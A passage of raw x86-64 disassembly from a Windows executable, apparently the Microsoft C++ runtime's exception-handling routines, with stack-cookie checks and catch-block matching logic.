   1400032e8:	0f 84 8b 00 00 00    	je     0x140003379
   1400032ee:	49 63 5e 14          	movslq 0x14(%r14),%rbx
   1400032f2:	49 8d 56 08          	lea    0x8(%r14),%rdx
   1400032f6:	49 8b 4d 28          	mov    0x28(%r13),%rcx
   1400032fa:	e8 89 f1 ff ff       	call   0x140002488
   1400032ff:	48 8b d0             	mov    %rax,%rdx
   140003302:	4c 8b c3             	mov    %rbx,%r8
   140003305:	48 8b ce             	mov    %rsi,%rcx
   140003308:	e8 23 c0 00 00       	call   0x14000f330
   14000330d:	eb 3b                	jmp    0x14000334a
   14000330f:	49 39 7d 28          	cmp    %rdi,0x28(%r13)
   140003313:	74 69                	je     0x14000337e
   140003315:	48 85 f6             	test   %rsi,%rsi
   140003318:	74 64                	je     0x14000337e
   14000331a:	85 db                	test   %ebx,%ebx
   14000331c:	74 11                	je     0x14000332f
   14000331e:	e8 85 fc ff ff       	call   0x140002fa8
   140003323:	48 8b c8             	mov    %rax,%rcx
   140003326:	49 63 46 18          	movslq 0x18(%r14),%rax
   14000332a:	48 03 c8             	add    %rax,%rcx
   14000332d:	eb 03                	jmp    0x140003332
   14000332f:	48 8b cf             	mov    %rdi,%rcx
   140003332:	48 85 c9             	test   %rcx,%rcx
   140003335:	74 47                	je     0x14000337e
   140003337:	41 8a 06             	mov    (%r14),%al
   14000333a:	24 04                	and    $0x4,%al
   14000333c:	f6 d8                	neg    %al
   14000333e:	1b c9                	sbb    %ecx,%ecx
   140003340:	f7 d9                	neg    %ecx
   140003342:	ff c1                	inc    %ecx
   140003344:	8b f9                	mov    %ecx,%edi
   140003346:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   14000334a:	8b c7                	mov    %edi,%eax
   14000334c:	eb 02                	jmp    0x140003350
   14000334e:	33 c0                	xor    %eax,%eax
   140003350:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140003355:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   14000335a:	48 8b 7c 24 60       	mov    0x60(%rsp),%rdi
   14000335f:	48 83 c4 30          	add    $0x30,%rsp
   140003363:	41 5f                	pop    %r15
   140003365:	41 5e                	pop    %r14
   140003367:	41 5d                	pop    %r13
   140003369:	c3                   	ret
   14000336a:	e8 a1 2a 00 00       	call   0x140005e10
   14000336f:	e8 9c 2a 00 00       	call   0x140005e10
   140003374:	e8 97 2a 00 00       	call   0x140005e10
   140003379:	e8 92 2a 00 00       	call   0x140005e10
   14000337e:	e8 8d 2a 00 00       	call   0x140005e10
   140003383:	90                   	nop
   140003384:	e8 87 2a 00 00       	call   0x140005e10
   140003389:	90                   	nop
   14000338a:	cc                   	int3
   14000338b:	cc                   	int3
   14000338c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003391:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140003396:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   14000339b:	41 56                	push   %r14
   14000339d:	48 83 ec 20          	sub    $0x20,%rsp
   1400033a1:	49 8b f9             	mov    %r9,%rdi
   1400033a4:	4c 8b f1             	mov    %rcx,%r14
   1400033a7:	33 db                	xor    %ebx,%ebx
   1400033a9:	41 39 18             	cmp    %ebx,(%r8)
   1400033ac:	7d 05                	jge    0x1400033b3
   1400033ae:	48 8b f2             	mov    %rdx,%rsi
   1400033b1:	eb 07                	jmp    0x1400033ba
   1400033b3:	49 63 70 08          	movslq 0x8(%r8),%rsi
   1400033b7:	48 03 32             	add    (%rdx),%rsi
   1400033ba:	e8 cd fd ff ff       	call   0x14000318c
   1400033bf:	83 e8 01             	sub    $0x1,%eax
   1400033c2:	74 3c                	je     0x140003400
   1400033c4:	83 f8 01             	cmp    $0x1,%eax
   1400033c7:	75 67                	jne    0x140003430
   1400033c9:	48 8d 57 08          	lea    0x8(%rdi),%rdx
   1400033cd:	49 8b 4e 28          	mov    0x28(%r14),%rcx
   1400033d1:	e8 b2 f0 ff ff       	call   0x140002488
   1400033d6:	4c 8b f0             	mov    %rax,%r14
   1400033d9:	39 5f 18             	cmp    %ebx,0x18(%rdi)
   1400033dc:	74 0c                	je     0x1400033ea
   1400033de:	e8 c5 fb ff ff       	call   0x140002fa8
   1400033e3:	48 63 5f 18          	movslq 0x18(%rdi),%rbx
   1400033e7:	48 03 d8             	add    %rax,%rbx
   1400033ea:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   1400033f0:	4d 8b c6             	mov    %r14,%r8
   1400033f3:	48 8b d3             	mov    %rbx,%rdx
   1400033f6:	48 8b ce             	mov    %rsi,%rcx
   1400033f9:	e8 e2 12 00 00       	call   0x1400046e0
   1400033fe:	eb 30                	jmp    0x140003430
   140003400:	48 8d 57 08          	lea    0x8(%rdi),%rdx
   140003404:	49 8b 4e 28          	mov    0x28(%r14),%rcx
   140003408:	e8 7b f0 ff ff       	call   0x140002488
   14000340d:	4c 8b f0             	mov    %rax,%r14
   140003410:	39 5f 18             	cmp    %ebx,0x18(%rdi)
   140003413:	74 0c                	je     0x140003421
   140003415:	e8 8e fb ff ff       	call   0x140002fa8
   14000341a:	48 63 5f 18          	movslq 0x18(%rdi),%rbx
   14000341e:	48 03 d8             	add    %rax,%rbx
   140003421:	4d 8b c6             	mov    %r14,%r8
   140003424:	48 8b d3             	mov    %rbx,%rdx
   140003427:	48 8b ce             	mov    %rsi,%rcx
   14000342a:	e8 a5 12 00 00       	call   0x1400046d4
   14000342f:	90                   	nop
   140003430:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003435:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000343a:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   14000343f:	48 83 c4 20          	add    $0x20,%rsp
   140003443:	41 5e                	pop    %r14
   140003445:	c3                   	ret
   140003446:	e8 c5 29 00 00       	call   0x140005e10
   14000344b:	90                   	nop
   14000344c:	48 8b c4             	mov    %rsp,%rax
   14000344f:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140003453:	4c 89 40 18          	mov    %r8,0x18(%rax)
   140003457:	55                   	push   %rbp
   140003458:	56                   	push   %rsi
   140003459:	57                   	push   %rdi
   14000345a:	41 54                	push   %r12
   14000345c:	41 55                	push   %r13
   14000345e:	41 56                	push   %r14
   140003460:	41 57                	push   %r15
   140003462:	48 83 ec 60          	sub    $0x60,%rsp
   140003466:	4c 8b ac 24 c0 00 00 	mov    0xc0(%rsp),%r13
   14000346d:	00 
   14000346e:	4d 8b f9             	mov    %r9,%r15
   140003471:	4c 8b e2             	mov    %rdx,%r12
   140003474:	4c 8d 48 10          	lea    0x10(%rax),%r9
   140003478:	48 8b e9             	mov    %rcx,%rbp
   14000347b:	4d 8b c5             	mov    %r13,%r8
   14000347e:	49 8b d7             	mov    %r15,%rdx
   140003481:	49 8b cc             	mov    %r12,%rcx
   140003484:	e8 73 f7 ff ff       	call   0x140002bfc
   140003489:	4c 8b 8c 24 d0 00 00 	mov    0xd0(%rsp),%r9
   140003490:	00 
   140003491:	4c 8b f0             	mov    %rax,%r14
   140003494:	48 8b b4 24 c8 00 00 	mov    0xc8(%rsp),%rsi
   14000349b:	00 
   14000349c:	4d 85 c9             	test   %r9,%r9
   14000349f:	74 0e                	je     0x1400034af
   1400034a1:	4c 8b c6             	mov    %rsi,%r8
   1400034a4:	48 8b d0             	mov    %rax,%rdx
   1400034a7:	48 8b cd             	mov    %rbp,%rcx
   1400034aa:	e8 dd fe ff ff       	call   0x14000338c
   1400034af:	48 8b 8c 24 d8 00 00 	mov    0xd8(%rsp),%rcx
   1400034b6:	00 
   1400034b7:	8b 59 08             	mov    0x8(%rcx),%ebx
   1400034ba:	8b 39                	mov    (%rcx),%edi
   1400034bc:	e8 d3 fa ff ff       	call   0x140002f94
   1400034c1:	48 63 4e 0c          	movslq 0xc(%rsi),%rcx
   1400034c5:	4d 8b ce             	mov    %r14,%r9
   1400034c8:	4c 8b 84 24 b0 00 00 	mov    0xb0(%rsp),%r8
   1400034cf:	00 
   1400034d0:	48 03 c1             	add    %rcx,%rax
   1400034d3:	8a 8c 24 f8 00 00 00 	mov    0xf8(%rsp),%cl
   1400034da:	48 8b d5             	mov    %rbp,%rdx
   1400034dd:	88 4c 24 50          	mov    %cl,0x50(%rsp)
   1400034e1:	49 8b cc             	mov    %r12,%rcx
   1400034e4:	4c 89 7c 24 48       	mov    %r15,0x48(%rsp)
   1400034e9:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   1400034ee:	89 5c 24 38          	mov    %ebx,0x38(%rsp)
   1400034f2:	89 7c 24 30          	mov    %edi,0x30(%rsp)
   1400034f6:	4c 89 6c 24 28       	mov    %r13,0x28(%rsp)
   1400034fb:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003500:	e8 fb f8 ff ff       	call   0x140002e00
   140003505:	48 8b 9c 24 a0 00 00 	mov    0xa0(%rsp),%rbx
   14000350c:	00 
   14000350d:	48 83 c4 60          	add    $0x60,%rsp
   140003511:	41 5f                	pop    %r15
   140003513:	41 5e                	pop    %r14
   140003515:	41 5d                	pop    %r13
   140003517:	41 5c                	pop    %r12
   140003519:	5f                   	pop    %rdi
   14000351a:	5e                   	pop    %rsi
   14000351b:	5d                   	pop    %rbp
   14000351c:	c3                   	ret
   14000351d:	cc                   	int3
   14000351e:	cc                   	int3
   14000351f:	cc                   	int3
   140003520:	40 55                	rex push %rbp
   140003522:	53                   	push   %rbx
   140003523:	56                   	push   %rsi
   140003524:	57                   	push   %rdi
   140003525:	41 54                	push   %r12
   140003527:	41 55                	push   %r13
   140003529:	41 56                	push   %r14
   14000352b:	41 57                	push   %r15
   14000352d:	48 8d 6c 24 d8       	lea    -0x28(%rsp),%rbp
   140003532:	48 81 ec 28 01 00 00 	sub    $0x128,%rsp
   140003539:	48 8b 05 c0 6a 01 00 	mov    0x16ac0(%rip),%rax        # 0x14001a000
   140003540:	48 33 c4             	xor    %rsp,%rax
   140003543:	48 89 45 18          	mov    %rax,0x18(%rbp)
   140003547:	48 8b bd 90 00 00 00 	mov    0x90(%rbp),%rdi
   14000354e:	4c 8b e2             	mov    %rdx,%r12
   140003551:	4c 8b ad a8 00 00 00 	mov    0xa8(%rbp),%r13
   140003558:	4d 8b f8             	mov    %r8,%r15
   14000355b:	4c 89 44 24 68       	mov    %r8,0x68(%rsp)
   140003560:	48 8b d9             	mov    %rcx,%rbx
   140003563:	48 89 54 24 78       	mov    %rdx,0x78(%rsp)
   140003568:	4c 8b c7             	mov    %rdi,%r8
   14000356b:	49 8b cc             	mov    %r12,%rcx
   14000356e:	4c 89 6d a0          	mov    %r13,-0x60(%rbp)
   140003572:	49 8b d1             	mov    %r9,%rdx
   140003575:	c6 44 24 60 00       	movb   $0x0,0x60(%rsp)
   14000357a:	49 8b f1             	mov    %r9,%rsi
   14000357d:	e8 42 0f 00 00       	call   0x1400044c4
   140003582:	44 8b f0             	mov    %eax,%r14d
   140003585:	83 f8 ff             	cmp    $0xffffffff,%eax
   140003588:	0f 8c 5b 04 00 00    	jl     0x1400039e9
   14000358e:	3b 47 04             	cmp    0x4(%rdi),%eax
   140003591:	0f 8d 52 04 00 00    	jge    0x1400039e9
   140003597:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   14000359d:	0f 85 c9 00 00 00    	jne    0x14000366c
   1400035a3:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   1400035a7:	0f 85 bf 00 00 00    	jne    0x14000366c
   1400035ad:	8b 43 20             	mov    0x20(%rbx),%eax
   1400035b0:	2d 20 05 93 19       	sub    $0x19930520,%eax
   1400035b5:	83 f8 02             	cmp    $0x2,%eax
   1400035b8:	0f 87 ae 00 00 00    	ja     0x14000366c
   1400035be:	48 83 7b 30 00       	cmpq   $0x0,0x30(%rbx)
   1400035c3:	0f 85 a3 00 00 00    	jne    0x14000366c
   1400035c9:	e8 3e f0 ff ff       	call   0x14000260c
   1400035ce:	48 83 78 20 00       	cmpq   $0x0,0x20(%rax)
   1400035d3:	0f 84 a9 03 00 00    	je     0x140003982
   1400035d9:	e8 2e f0 ff ff       	call   0x14000260c
   1400035de:	48 8b 58 20          	mov    0x20(%rax),%rbx
   1400035e2:	e8 25 f0 ff ff       	call   0x14000260c
   1400035e7:	48 8b 4b 38          	mov    0x38(%rbx),%rcx
   1400035eb:	c6 44 24 60 01       	movb   $0x1,0x60(%rsp)
   1400035f0:	4c 8b 78 28          	mov    0x28(%rax),%r15
   1400035f4:	4c 89 7c 24 68       	mov    %r15,0x68(%rsp)
   1400035f9:	e8 d6 f9 ff ff       	call   0x140002fd4
   1400035fe:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   140003604:	75 1e                	jne    0x140003624
   140003606:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   14000360a:	75 18                	jne    0x140003624
   14000360c:	8b 43 20             	mov    0x20(%rbx),%eax
   14000360f:	2d 20 05 93 19       	sub    $0x19930520,%eax
   140003614:	83 f8 02             	cmp    $0x2,%eax
   140003617:	77 0b                	ja     0x140003624
   140003619:	48 83 7b 30 00       	cmpq   $0x0,0x30(%rbx)
   14000361e:	0f 84 c5 03 00 00    	je     0x1400039e9
   140003624:	e8 e3 ef ff ff       	call   0x14000260c
   140003629:	48 83 78 38 00       	cmpq   $0x0,0x38(%rax)
   14000362e:	74 3c                	je     0x14000366c
   140003630:	e8 d7 ef ff ff       	call   0x14000260c
   140003635:	4c 8b 78 38          	mov    0x38(%rax),%r15
   140003639:	e8 ce ef ff ff       	call   0x14000260c
   14000363e:	49 8b d7             	mov    %r15,%rdx
   140003641:	48 8b cb             	mov    %rbx,%rcx
   140003644:	48 83 60 38 00       	andq   $0x0,0x38(%rax)
   140003649:	e8 0e 0f 00 00       	call   0x14000455c
   14000364e:	84 c0                	test   %al,%al
   140003650:	75 15                	jne    0x140003667
   140003652:	49 8b cf             	mov    %r15,%rcx
   140003655:	e8 f2 0f 00 00       	call   0x14000464c
   14000365a:	84 c0                	test   %al,%al
   14000365c:	0f 84 64 03 00 00    	je     0x1400039c6
   140003662:	e9 3b 03 00 00       	jmp    0x1400039a2
   140003667:	4c 8b 7c 24 68       	mov    0x68(%rsp),%r15
   14000366c:	48 8b 46 08          	mov    0x8(%rsi),%rax
   140003670:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
   140003674:	48 89 7d c0          	mov    %rdi,-0x40(%rbp)
   140003678:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   14000367e:	0f 85 b5 02 00 00    	jne    0x140003939
   140003684:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   140003688:	0f 85 ab 02 00 00    	jne    0x140003939
   14000368e:	8b 43 20             	mov    0x20(%rbx),%eax
   140003691:	2d 20 05 93 19       	sub    $0x19930520,%eax
   140003696:	83 f8 02             	cmp    $0x2,%eax
   140003699:	0f 87 9a 02 00 00    	ja     0x140003939
   14000369f:	83 7f 0c 00          	cmpl   $0x0,0xc(%rdi)
   1400036a3:	0f 86 c0 01 00 00    	jbe    0x140003869
   1400036a9:	8b 85 a0 00 00 00    	mov    0xa0(%rbp),%eax
   1400036af:	48 8d 55 c0          	lea    -0x40(%rbp),%rdx
   1400036b3:	89 44 24 28          	mov    %eax,0x28(%rsp)
   1400036b7:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1400036bb:	4c 8b ce             	mov    %rsi,%r9
   1400036be:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400036c3:	45 8b c6             	mov    %r14d,%r8d
   1400036c6:	e8 01 f6 ff ff       	call   0x140002ccc
   1400036cb:	0f 10 4d e0          	movups -0x20(%rbp),%xmm1
   1400036cf:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1400036d3:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   1400036d8:	66 0f 7e c0          	movd   %xmm0,%eax
   1400036dc:	f3 0f 7f 4d d0       	movdqu %xmm1,-0x30(%rbp)
   1400036e1:	3b 45 f8             	cmp    -0x8(%rbp),%eax
   1400036e4:	0f 83 7f 01 00 00    	jae    0x140003869
   1400036ea:	44 8b 7d d8          	mov    -0x28(%rbp),%r15d
   1400036ee:	66 49 0f 7e c9       	movq   %xmm1,%r9
   1400036f3:	4c 89 4d 88          	mov    %r9,-0x78(%rbp)
   1400036f7:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
   1400036fb:	48 8b 00             	mov    (%rax),%rax
   1400036fe:	48 63 50 10          	movslq 0x10(%rax),%rdx
   140003702:	41 8b c7             	mov    %r15d,%eax
   140003705:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140003709:	49 8b 41 08          	mov    0x8(%r9),%rax
   14000370d:	4c 8d 04 8a          	lea    (%rdx,%rcx,4),%r8
   140003711:	41 0f 10 04 00       	movups (%r8,%rax,1),%xmm0
   140003716:	49 63 4c 00 10       	movslq 0x10(%r8,%rax,1),%rcx
   14000371b:	89 4d b8             	mov    %ecx,-0x48(%rbp)
   14000371e:	66 0f 7e c0          	movd   %xmm0,%eax
   140003722:	0f 11 45 a8          	movups %xmm0,-0x58(%rbp)
   140003726:	41 3b c6             	cmp    %r14d,%eax
   140003729:	0f 8f 2d 01 00 00    	jg     0x14000385c
   14000372f:	66 48 0f 7e c0       	movq   %xmm0,%rax
   140003734:	48 c1 e8 20          	shr    $0x20,%rax
   140003738:	44 3b f0             	cmp    %eax,%r14d
   14000373b:	0f 8f 1b 01 00 00    	jg     0x14000385c
   140003741:	48 03 4e 08          	add    0x8(%rsi),%rcx
   140003745:	45 33 e4             	xor    %r12d,%r12d
   140003748:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   14000374d:	66 48 0f 7e c0       	movq   %xmm0,%rax
   140003752:	48 89 4d 98          	mov    %rcx,-0x68(%rbp)
   140003756:	48 c1 e8 20          	shr    $0x20,%rax
   14000375a:	48 89 45 90          	mov    %rax,-0x70(%rbp)
   14000375e:	85 c0                	test   %eax,%eax
   140003760:	0f 84 e6 00 00 00    	je     0x14000384c
   140003766:	4b 8d 04 a4          	lea    (%r12,%r12,4),%rax
   14000376a:	0f 10 04 81          	movups (%rcx,%rax,4),%xmm0
   14000376e:	0f 11 45 00          	movups %xmm0,0x0(%rbp)
   140003772:	8b 44 81 10          	mov    0x10(%rcx,%rax,4),%eax
   140003776:	89 45 10             	mov    %eax,0x10(%rbp)
   140003779:	e8 2a f8 ff ff       	call   0x140002fa8
   14000377e:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   140003782:	48 83 c0 04          	add    $0x4,%rax
   140003786:	48 63 51 0c          	movslq 0xc(%rcx),%rdx
   14000378a:	48 03 c2             	add    %rdx,%rax
   14000378d:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   140003792:	e8 11 f8 ff ff       	call   0x140002fa8
   140003797:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   14000379b:	48 63 51 0c          	movslq 0xc(%rcx),%rdx
   14000379f:	44 8b 2c 10          	mov    (%rax,%rdx,1),%r13d
   1400037a3:	eb 31                	jmp    0x1400037d6
   1400037a5:	e8 fe f7 ff ff       	call   0x140002fa8
   1400037aa:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   1400037af:	4c 8b 43 30          	mov    0x30(%rbx),%r8
   1400037b3:	48 63 09             	movslq (%rcx),%rcx
   1400037b6:	48 03 c1             	add    %rcx,%rax
   1400037b9:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   1400037bd:	48 8b d0             	mov    %rax,%rdx
   1400037c0:	48 89 45 80          	mov    %rax,-0x80(%rbp)
   1400037c4:	e8 97 04 00 00       	call   0x140003c60
   1400037c9:	85 c0                	test   %eax,%eax
   1400037cb:	75 20                	jne    0x1400037ed
   1400037cd:	41 ff cd             	dec    %r13d
   1400037d0:	48 83 44 24 70 04    	addq   $0x4,0x70(%rsp)
   1400037d6:	45 85 ed             	test   %r13d,%r13d
   1400037d9:	7f ca                	jg     0x1400037a5
   1400037db:	41 ff c4             	inc    %r12d
   1400037de:	44 3b 65 90          	cmp    -0x70(%rbp),%r12d
   1400037e2:	74 6f                	je     0x140003853
   1400037e4:	48 8b 4d 98          	mov    -0x68(%rbp),%rcx
   1400037e8:	e9 79 ff ff ff       	jmp    0x140003766
   1400037ed:	8a 85 98 00 00 00    	mov    0x98(%rbp),%al
   1400037f3:	4c 8b ce             	mov    %rsi,%r9
   1400037f6:	4c 8b 64 24 78       	mov    0x78(%rsp),%r12
   1400037fb:	48 8b cb             	mov    %rbx,%rcx
   1400037fe:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
   140003803:	49 8b d4             	mov    %r12,%rdx
   140003806:	88 44 24 58          	mov    %al,0x58(%rsp)
   14000380a:	8a 44 24 60          	mov    0x60(%rsp),%al
   14000380e:	88 44 24 50          	mov    %al,0x50(%rsp)
   140003812:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
   140003816:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   14000381b:	8b 85 a0 00 00 00    	mov    0xa0(%rbp),%eax
   140003821:	89 44 24 40          	mov    %eax,0x40(%rsp)
   140003825:	48 8d 45 a8          	lea    -0x58(%rbp),%rax
   140003829:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   14000382e:	48 8b 45 80          	mov    -0x80(%rbp),%rax
   140003832:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140003837:	48 8d 45 00          	lea    0x0(%rbp),%rax
   14000383b:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140003840:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140003845:	e8 02 fc ff ff       	call   0x14000344c
   14000384a:	eb 0c                	jmp    0x140003858
   14000384c:	4c 8b 64 24 78       	mov    0x78(%rsp),%r12
   140003851:	eb 09                	jmp    0x14000385c
   140003853:	4c 8b 64 24 78       	mov    0x78(%rsp),%r12
   140003858:	4c 8b 4d 88          	mov    -0x78(%rbp),%r9
   14000385c:	41 ff c7             	inc    %r15d
   14000385f:	44 3b 7d f8          	cmp    -0x8(%rbp),%r15d
   140003863:	0f 82 8e fe ff ff    	jb     0x1400036f7
   140003869:	8b 07                	mov    (%rdi),%eax
   14000386b:	25 ff ff ff 1f       	and    $0x1fffffff,%eax
   140003870:	3d 21 05 93 19       	cmp    $0x19930521,%eax
   140003875:	0f 82 fb 00 00 00    	jb     0x140003976
   14000387b:	83 7f 20 00          	cmpl   $0x0,0x20(%rdi)
   14000387f:	74 0e                	je     0x14000388f
   140003881:	e8 0e f7 ff ff       	call   0x140002f94
   140003886:	48 63 4f 20          	movslq 0x20(%rdi),%rcx
   14000388a:	48 03 c1             	add    %rcx,%rax
   14000388d:	75 21                	jne    0x1400038b0
   14000388f:	8b 47 24             	mov    0x24(%rdi),%eax
   140003892:	c1 e8 02             	shr    $0x2,%eax
   140003895:	a8 01                	test   $0x1,%al
   140003897:	0f 84 d9 00 00 00    	je     0x140003976
   14000389d:	48 8b d7             	mov    %rdi,%rdx
   1400038a0:	48 8b ce             	mov    %rsi,%rcx
   1400038a3:	e8 c4 f2 ff ff       	call   0x140002b6c
   1400038a8:	84 c0                	test   %al,%al
   1400038aa:	0f 85 c6 00 00 00    	jne    0x140003976
   1400038b0:	8b 47 24             	mov    0x24(%rdi),%eax
   1400038b3:	c1 e8 02             	shr    $0x2,%eax
   1400038b6:	a8 01                	test   $0x1,%al
   1400038b8:	0f 85 0e 01 00 00    	jne    0x1400039cc
   1400038be:	83 7f 20 00          	cmpl   $0x0,0x20(%rdi)
   1400038c2:	74 11                	je     0x1400038d5
   1400038c4:	e8 cb f6 ff ff       	call   0x140002f94
   1400038c9:	48 8b d0             	mov    %rax,%rdx
   1400038cc:	48 63 47 20          	movslq 0x20(%rdi),%rax
   1400038d0:	48 03 d0             	add    %rax,%rdx
   1400038d3:	eb 02                	jmp    0x1400038d7
   1400038d5:	33 d2                	xor    %edx,%edx
   1400038d7:	48 8b cb             	mov    %rbx,%rcx
   1400038da:	e8 7d 0c 00 00       	call   0x14000455c
   1400038df:	84 c0                	test   %al,%al
   1400038e1:	0f 85 8f 00 00 00    	jne    0x140003976
   1400038e7:	4c 8d 4d 80          	lea    -0x80(%rbp),%r9
   1400038eb:	4c 8b c7             	mov    %rdi,%r8
   1400038ee:	48 8b d6             	mov    %rsi,%rdx
   1400038f1:	49 8b cc             	mov    %r12,%rcx
   1400038f4:	e8 03 f3 ff ff       	call   0x140002bfc
   1400038f9:	8a 8d 98 00 00 00    	mov    0x98(%rbp),%cl
   1400038ff:	4c 8b c8             	mov    %rax,%r9
   140003902:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
   140003907:	48 8b d3             	mov    %rbx,%rdx
   14000390a:	88 4c 24 50          	mov    %cl,0x50(%rsp)
   14000390e:	83 c9 ff             	or     $0xffffffff,%ecx
   140003911:	48 89 74 24 48       	mov    %rsi,0x48(%rsp)
   140003916:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   14000391c:	89 4c 24 38          	mov    %ecx,0x38(%rsp)
   140003920:	89 4c 24 30          	mov    %ecx,0x30(%rsp)
   140003924:	49 8b cc             	mov    %r12,%rcx
   140003927:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   14000392c:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140003932:	e8 c9 f4 ff ff       	call   0x140002e00
   140003937:	eb 3d                	jmp    0x140003976
   140003939:	83 7f 0c 00          	cmpl   $0x0,0xc(%rdi)
   14000393d:	76 37                	jbe    0x140003976
   14000393f:	80 bd 98 00 00 00 00 	cmpb   $0x0,0x98(%rbp)
   140003946:	0f 85 9d 00 00 00    	jne    0x1400039e9
   14000394c:	8b 85 a0 00 00 00    	mov    0xa0(%rbp),%eax
   140003952:	4c 8b ce             	mov    %rsi,%r9
   140003955:	4c 89 6c 24 38       	mov    %r13,0x38(%rsp)
   14000395a:	4d 8b c7             	mov    %r15,%r8
   14000395d:	89 44 24 30          	mov    %eax,0x30(%rsp)
   140003961:	49 8b d4             	mov    %r12,%rdx
   140003964:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   140003969:	48 8b cb             	mov    %rbx,%rcx
   14000396c:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140003971:	e8 7a 00 00 00       	call   0x1400039f0
   140003976:	e8 91 ec ff ff       	call   0x14000260c
   14000397b:	48 83 78 38 00       	cmpq   $0x0,0x38(%rax)
   140003980:	75 67                	jne    0x1400039e9
   140003982:	48 8b 4d 18          	mov    0x18(%rbp),%rcx
   140003986:	48 33 cc             	xor    %rsp,%rcx
   140003989:	e8 d2 d9 ff ff       	call   0x140001360
   14000398e:	48 81 c4 28 01 00 00 	add    $0x128,%rsp
   140003995:	41 5f                	pop    %r15
   140003997:	41 5e                	pop    %r14
   140003999:	41 5d                	pop    %r13
   14000399b:	41 5c                	pop    %r12
   14000399d:	5f                   	pop    %rdi
   14000399e:	5e                   	pop    %rsi
   14000399f:	5b                   	pop    %rbx
   1400039a0:	5d                   	pop    %rbp
   1400039a1:	c3                   	ret
   1400039a2:	b2 01                	mov    $0x1,%dl
   1400039a4:	48 8b cb             	mov    %rbx,%rcx
   1400039a7:	e8 38 ea ff ff       	call   0x1400023e4
   1400039ac:	48 8d 4d a8          	lea    -0x58(%rbp),%rcx
   1400039b0:	e8 67 06 00 00       	call   0x14000401c
   1400039b5:	48 8d 15 ec 56 01 00 	lea    0x156ec(%rip),%rdx        # 0x1400190a8
   1400039bc:	48 8d 4d a8          	lea    -0x58(%rbp),%rcx
   1400039c0:	e8 83 0e 00 00       	call   0x140004848
   1400039c5:	cc                   	int3
   1400039c6:	e8 9d 23 00 00       	call   0x140005d68
   1400039cb:	cc                   	int3
   1400039cc:	e8 3b ec ff ff       	call   0x14000260c
   1400039d1:	48 89 58 20          	mov    %rbx,0x20(%rax)
   1400039d5:	e8 32 ec ff ff       	call   0x14000260c
   1400039da:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   1400039df:	48 89 48 28          	mov    %rcx,0x28(%rax)
   1400039e3:	e8 80 23 00 00       	call   0x140005d68
   1400039e8:	cc                   	int3
   1400039e9:	e8 22 24 00 00       	call   0x140005e10
   1400039ee:	cc                   	int3
   1400039ef:	cc                   	int3
   1400039f0:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400039f5:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   1400039fa:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1400039ff:	55                   	push   %rbp
   140003a00:	56                   	push   %rsi
   140003a01:	57                   	push   %rdi
   140003a02:	41 54                	push   %r12
   140003a04:	41 55                	push   %r13
   140003a06:	41 56                	push   %r14
   140003a08:	41 57                	push   %r15
   140003a0a:	48 81 ec c0 00 00 00 	sub    $0xc0,%rsp
   140003a11:	81 39 03 00 00 80    	cmpl   $0x80000003,(%rcx)
   140003a17:	49 8b e9             	mov    %r9,%rbp
   140003a1a:	4d 8b e0             	mov    %r8,%r12
   140003a1d:	4c 8b f2             	mov    %rdx,%r14
   140003a20:	48 8b f1             	mov    %rcx,%rsi
   140003a23:	0f 84 13 02 00 00    	je     0x140003c3c
   140003a29:	e8 de eb ff ff       	call   0x14000260c
   140003a2e:	44 8b ac 24 30 01 00 	mov    0x130(%rsp),%r13d
   140003a35:	00 
   140003a36:	44 8b bc 24 28 01 00 	mov    0x128(%rsp),%r15d
   140003a3d:	00 
   140003a3e:	48 8b bc 24 20 01 00 	mov    0x120(%rsp),%rdi
   140003a45:	00 
   140003a46:	48 83 78 10 00       	cmpq   $0x0,0x10(%rax)
   140003a4b:	74 5b                	je     0x140003aa8
   140003a4d:	33 c9                	xor    %ecx,%ecx
